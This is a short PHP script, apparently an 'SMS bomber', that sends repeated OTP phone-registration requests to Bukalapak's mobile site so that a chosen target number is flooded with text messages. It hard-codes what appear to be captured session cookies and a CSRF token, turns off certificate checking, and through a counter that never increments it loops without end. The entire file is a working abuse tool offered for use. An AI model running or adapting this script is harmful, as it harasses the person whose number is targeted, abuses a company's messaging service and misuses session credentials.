<?php
// Copyright: YarzC0de
$config['headers'] = explode("\n", "Host: m.bukalapak.com
Connection: keep-alive
Content-Length: 72
X-NewRelic-ID: VQcDWF9ADgIJVVBQ
Origin: https://m.bukalapak.com
X-CSRF-Token: DFPXHzyVtGihu4jV/OruKvxtd40dFR3IgwC+QijaW0sWr08veSH3849GXj3geuVbALzsjY3eGgluqErHppFJUQ==
User-Agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://m.bukalapak.com/register?from=header
Accept-Encoding: gzip, deflate, br
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: identity=fefa8564503e42ec08d02fd901ae9883; browser_id=bf859e75301c8ae77b403dca6194326c; _ga=GA1.2.483646857.1527081845; _vwo_uuid_v2=D375A41873EC2DFDF87745564973213A2|115a6ba7d73d2bfe5b2acb237d8485e6; _gcl_aw=GCL.1527315004.Cj0KCQjw6J7YBRC4ARIsAJMXXsenvrYu5pa-J02Gd7UOhKG8gv85nT6SDOqZeMhNBAL3JhP8w_nP8bEaAvZREALw_wcB; _gac_UA-12425854-1=1.1528598695.CjwKCAjw9e3YBRBcEiwAzjCJuhh8ip6aB7W-BY9KRuJzTJokMqc4C3Zx7ceHIFx7AqfDXRVASSr8hhoCaXQQAvD_BwE; session_id=106e521c4c3448fe68551ca8ecc78dd4; _gid=GA1.2.1112964177.1530270353; __auc=42da23c21644b388be3371e33b5; scs=%7B%22t%22%3A1%7D; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%221644b388e73401-04706689c294e2-354c5266-100200-1644b388e7a95d%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ins-gaSSId=389576a1-b291-c457-154a-187102e30f8d_1530287298; _td=a23acc4f-c0e6-4c6e-dfe8-757f106db6f9; G_ENABLED_IDPS=google; insdrSV=9; spUID=1527314993805a1484c958a.52cb8977; request_method=POST; lskjfewjrh34ghj23brjh234=b2R5MU1wN21wTjcyUm1La3VXeUlMNzErZGZHS0tOazloMzdhTjVZVitGWlkxTkhTOUVFN0VtN3FrdXJwTWFCeElMeWwwaDBSZVFwYUJTbzJqNUl5M2h4UWFRQnRuOE95aGNBMFA3aGY2ZWxoNmh2RGpmeFp1SmUrelFDL1NGdzZQNjh0U0xtM1Ywb3NvS0VTOFcwRGRzb1RwVkt6bEhtNTFWNzROK3VNMU5yazhmTU4yRGJQQXluQUdnakVNUXozZ0VBYUh3MHREMU15Q1hQZEg4ZkQwcGxLYU4yTENLeWRLMHpLOUhNL3hObkxLZVQvOVFQMHZZMXQ2OTE3eUJtQ3ZQU1BZMjI0SXhrb0QwNlR0QUxPNk5PanNERWNqSldJQ2lBK1V3YzllV2FYdWIrS2pKaXFtS1psMVY4K2lEQTBWaXV3aWovNTZSejUvczl6NHZaM1J3PT0tLVdMeFVIc05nVEJ5MG9jcm1KS25kK0E9PQ%3D%3D--efc9e6f6a6993229302845bb2e4d05849f9015d2");

$nomer = 'Nomer Target';
$i = 0;
$jumlah = "10";
while($i < $jumlah) {
$send = json_decode(curl($nomer));
if(isset($send->status) AND $send->status == 'success') {
	echo "Sukses mengirim sms ke nomer handphone ".$nomer." <br />";
} else {
	echo "Gagal mengirim ke nomor ".$nomer." karena ".$send->message." <br />";
}
sleep(1); // Wait one seconds
}


function curl($nomer) {
	global $config;
	$ar = http_build_query(array('feature' => 'phone_registration',
                                 'manual_phone' => $nomer,
                                 'is_reskin' => true,
                                 'device_fingerprint' => ''
                             )
                           );
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://m.bukalapak.com/trusted_devices/otp_request");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
	$a = curl_exec($ch);
	curl_close($ch);

	return $a;
}
